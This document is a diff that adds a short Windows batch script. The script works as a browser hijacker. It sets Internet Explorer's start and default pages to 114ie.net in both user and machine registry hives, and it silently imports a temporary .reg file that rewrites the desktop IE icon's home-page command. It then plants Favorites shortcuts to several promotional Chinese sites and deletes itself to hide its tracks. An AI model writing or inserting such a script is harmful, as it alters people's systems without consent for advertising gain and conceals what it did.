@@ -1,0 +1,24 @@
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.114ie.net/ /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://www.114ie.net/ /f 
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.114ie.net/ /f 
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://www.114ie.net/ /f 
+reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http://www.114ie.net/" /f  
+echo [HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command] >>xuqs.reg  
+echo @="\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://www.114ie.net/" >>xuqs.reg  
+regedit /s xuqs.reg 
+del xuqs.reg /q /f /a 
+echo [InternetShortcut] > "%USERPROFILE%\Favorites\天下桌面-最大的电脑桌面美化风格主题包和系统光盘下载网站.url"
+echo URL=http://www.wintd.com/?Favorites >> "%USERPROFILE%\Favorites\天下桌面-最大的电脑桌面美化风格主题包和系统光盘下载网站.url"
+echo [InternetShortcut] > "%USERPROFILE%\Favorites\一键天下软件站-绿色精品软件.url"
+echo URL=http://www.yjtx.net/?Favorites >> "%USERPROFILE%\Favorites\一键天下软件站-绿色精品软件.url"
+echo [InternetShortcut] > "%USERPROFILE%\Favorites\114影院_114电影网_114影视_免费在线观看电影网站.url"
+echo URL=http://dy.114ie.net/?Favorites >> "%USERPROFILE%\Favorites\114影院_114电影网_114影视_免费在线观看电影网站.url"
+echo IDList= >> "%USERPROFILE%\Favorites\114影院_114电影网_114影视_免费在线观看电影网站.url"
+
+@start iexplore.exe http://www.114ie.net/
+
+@echo off
+
+@echo off
+
+del %0
